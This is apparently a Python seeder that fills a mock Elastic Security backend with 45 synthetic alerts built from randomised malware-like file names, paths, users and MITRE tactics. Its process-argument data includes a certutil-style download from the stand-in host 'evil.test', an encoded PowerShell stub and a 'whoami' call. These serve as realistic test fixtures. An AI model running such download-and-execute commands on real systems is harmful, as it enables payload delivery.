"""Elastic Security alerts seeder."""
from __future__ import annotations

import random

from faker import Faker

from domain.es_alert import EsAlert
from infrastructure.seeders._shared import rand_ago
from infrastructure.seeders.es_shared import (
    ES_MITRE_TACTICS,
    ES_MITRE_TECHNIQUES,
    ES_PROCESS_NAMES,
    es_uuid,
)
from repository.es_alert_repo import es_alert_repo
from repository.es_endpoint_repo import es_endpoint_repo
from repository.es_rule_repo import es_rule_repo

_STATUS_WEIGHTS: list[str] = (
    ["open"] * 12
    + ["acknowledged"] * 4
    + ["closed"] * 4
)

_FILE_NAMES: list[str] = [
    "payload.exe", "dropper.dll", "malware.bin", "ransomware.exe",
    "stealer.exe", "loader.dll", "beacon.exe", "implant.exe",
    "cryptor.exe", "inject.dll",
]

_FILE_PATHS: list[str] = [
    "C:\\Users\\jdoe\\AppData\\Local\\Temp\\",
    "C:\\Users\\admin\\Downloads\\",
    "C:\\Windows\\Temp\\",
    "/tmp/",
    "/var/tmp/",
    "/home/analyst/.cache/",
    "C:\\ProgramData\\",
    "C:\\Users\\Public\\",
]

_USERNAMES: list[str] = [
    "jdoe", "admin", "svc_backup", "analyst", "developer",
    "root", "SYSTEM", "svc_scanner", "helpdesk", "operator",
]


def seed_es_alerts(
    fake: Faker,
    endpoint_ids: list[str],
    rule_ids: list[str],
) -> list[str]:
    """Generate 45 Elastic Security alerts linked to rules and endpoints.

    Args:
        fake:         Shared Faker instance (seeded externally).
        endpoint_ids: List of endpoint agent_id strings to link alerts to.
        rule_ids:     List of rule ID strings to link alerts to.

    Returns:
        List of alert ID strings.
    """
    alert_ids: list[str] = []

    for _ in range(45):
        alert_id = es_uuid()
        alert_ids.append(alert_id)

        # Pick a random rule and endpoint
        rule_doc_id = random.choice(rule_ids)
        rule = es_rule_repo.get(rule_doc_id)
        ep_id = random.choice(endpoint_ids)
        ep = es_endpoint_repo.get(ep_id)

        status = random.choice(_STATUS_WEIGHTS)
        tactic = random.choice(ES_MITRE_TACTICS)
        technique = random.choice(ES_MITRE_TECHNIQUES)
        process_name = random.choice(ES_PROCESS_NAMES)
        file_name = random.choice(_FILE_NAMES)
        file_path = random.choice(_FILE_PATHS)
        username = random.choice(_USERNAMES)
        timestamp = rand_ago(random.randint(0, 30))

        # Build process args
        args_options: list[list[str]] = [
            [process_name, "-enc", "SQBFAFgA..."],
            [process_name, "/c", "whoami"],
            [process_name, "-urlcache", "-split", "-f", "http://evil.test/payload"],
            [process_name],
            [process_name, "--silent", "--output", "/tmp/out"],
        ]

        es_alert_repo.save(EsAlert(
            id=alert_id,
            signal_status=status,
            signal_rule_id=rule.rule_id if rule else "",
            signal_rule_name=rule.name if rule else "Unknown Rule",
            signal_rule_severity=rule.severity if rule else "medium",
            signal_rule_risk_score=rule.risk_score if rule else 50,
            agent_id=ep_id,
            hostname=ep.hostname if ep else "unknown",
            host_ip=ep.host_ip[0] if ep and ep.host_ip else "",
            host_os=ep.host_os_name if ep else "",
            process_name=process_name,
            process_executable=f"{file_path}{process_name}",
            process_args=random.choice(args_options),
            process_pid=random.randint(1000, 65535),
            user_name=username,
            file_name=file_name,
            file_path=f"{file_path}{file_name}",
            file_hash_sha256=fake.sha256(),
            timestamp=timestamp,
            threat_tactic_name=tactic["name"],
            threat_tactic_id=tactic["id"],
            threat_technique_name=technique["name"],
            threat_technique_id=technique["id"],
            tags=["Elastic", "Endpoint"],
            assignees=[],
            workflow_status=status,
        ))

    return alert_ids
